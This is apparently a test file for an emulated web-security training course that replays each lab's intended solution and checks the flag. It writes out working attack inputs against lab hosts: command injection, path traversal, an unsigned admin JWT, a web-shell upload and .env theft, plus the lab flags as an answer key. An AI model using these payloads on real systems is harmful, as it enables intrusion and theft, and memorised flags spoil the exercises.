import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the WEB labs: each entry loads the REAL
// fixture bundle from content/labs, mirrors the `lab:` block from the lesson
// front-matter, replays the intended solution with the emulated tools, and
// asserts `check` passes. If a lab stops being solvable in the engine, this
// fails.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

// solution: array of command lines run in order (last one writes found.txt).
const LABS = [
  {
    id: 'web-tool-curl', flag: 'nto{curl_1s_4ll_y0u_n33d}', hints: 4,
    solution: [`curl -s http://api.lab.local/v1/me -H "Authorization: Bearer x" | cut -d: -f4 > found.txt`],
  },
  {
    id: 'web-recon-fuzzing', flag: 'nto{hidden_paths_ar3_st1ll_th3r3}', hints: 4,
    solution: [
      `ffuf -u 'http://shop.lab.local/FUZZ' -w wordlist.txt -mc all -fc 404`,
      `curl -s http://shop.lab.local/backup/flag.txt > found.txt`,
    ],
  },
  {
    id: 'web-openapi-exposure', flag: 'nto{sw4gger_m4ps_th3_wh0le_ap1}', hints: 4,
    solution: [
      `ffuf -w api_paths.txt -u http://api.lab.local/FUZZ -mc 200 -s`,
      `curl -s http://api.lab.local/v3/api-docs -o api.json`,
      `grep -o '/internal/[a-z]*' api.json`,
      `curl -s http://api.lab.local/internal/flag | cut -d: -f3 > found.txt`,
    ],
  },
  {
    id: 'web-git-env-exposure', flag: 'nto{g1t_h1st0ry_n3v3r_f0rg3ts}', hints: 4,
    solution: [
      `curl -s -i http://app.lab.local/.git/HEAD`,
      `curl -s http://app.lab.local/.env | grep FLAG | cut -d= -f2 > found.txt`,
    ],
  },
  {
    id: 'web-tool-nuclei', flag: 'nto{g1t_h1st0ry_n3v3r_f0rg3ts}', hints: 4,
    solution: [
      `nuclei -u http://app.lab.local -tags exposure,git`,
      `curl -s http://app.lab.local/.env | grep FLAG | cut -d= -f2 > found.txt`,
    ],
  },
  {
    id: 'web-tool-sqlmap', flag: 'nto{un10n_s3l3ct_0p3ns_th3_d00r}', hints: 4,
    solution: [
      `sqlmap -u 'http://shop.lab.local/product?id=1' --batch --dump | grep 'nto{' | cut -d'|' -f4 > found.txt`,
    ],
  },
  {
    id: 'web-command-injection', flag: 'nto{c0mm4nd_1nj3ct10n_1s_st1ll_rce}', hints: 4,
    solution: [
      `curl -s -G http://shop.lab.local/ping --data-urlencode 'host=127.0.0.1;id'`,
      `curl -s -G http://shop.lab.local/ping --data-urlencode 'host=127.0.0.1;cat flag.txt' | tail -1 > found.txt`,
    ],
  },
  {
    id: 'web-lfi-path-traversal', flag: 'nto{tr4v3rs4l_r34ds_3v3ry_f1l3}', hints: 4,
    solution: [
      `curl -s -G http://shop.lab.local/download --data-urlencode 'file=../flag.txt' > found.txt`,
    ],
  },
  {
    id: 'web-jwt-advanced', flag: 'nto{4lg_c0nfus10n_w1ns_4g41n}', hints: 4,
    solution: [
      `export H=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=`,
      `export P=eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9`,
      `curl -s http://api.lab.local/v1/admin -H "Authorization: Bearer $H.$P." | cut -d: -f3 > found.txt`,
    ],
  },
  {
    id: 'web-file-upload', flag: 'nto{upl04d_byp4ss_t0_w3bsh3ll}', hints: 4,
    solution: [
      `curl -s -F 'file=@shell.php;type=image/png' -F 'name=avatar' http://app.lab.local/upload`,
      `curl -s 'http://app.lab.local/uploads/ab12cd.php?c=cat flag.txt' | tail -1 > found.txt`,
    ],
  },
]

describe.each(LABS)('web lab: $id', ({ id, flag, hints, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1) // not solved yet
    for (const cmd of solution) await s.run(cmd)
    const r = await s.run('check')
    expect(r.code).toBe(0)
    expect(r.stdout).toContain('Готово')
    expect(s.solved).toBe(true)
    // the flag really is in found.txt
    expect(s.vfs.readText(`${WD}/found.txt`)).toContain(flag)
  })

  it('hints are progressive and never contain the full flag', () => {
    for (const h of spec.hints) expect(h).not.toContain(flag)
  })
})
